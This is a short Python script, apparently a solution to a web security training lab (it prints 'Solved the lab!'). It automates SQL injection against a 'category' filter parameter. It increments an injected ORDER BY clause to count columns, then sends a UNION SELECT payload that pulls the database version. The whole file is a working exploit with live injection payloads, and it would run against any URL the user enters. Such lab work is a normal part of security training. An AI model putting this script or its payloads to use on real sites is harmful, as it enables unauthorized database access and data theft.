import requests

url = input("Nhập URL: ").rstrip("/")

i = 1
while True:
    order_url = f"{url}/filter?category=Gifts'+ORDER+BY+{i}%23"
    response = requests.get(order_url)

    if response.status_code == 200:
        i += 1
    else:
        i -= 1
        break

null_values = ",+".join(["NULL"] * (i - 1))
union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+@@version,+{null_values}%23"

response = requests.get(union_url)

if response.status_code == 200:
    print("Solved the lab!")
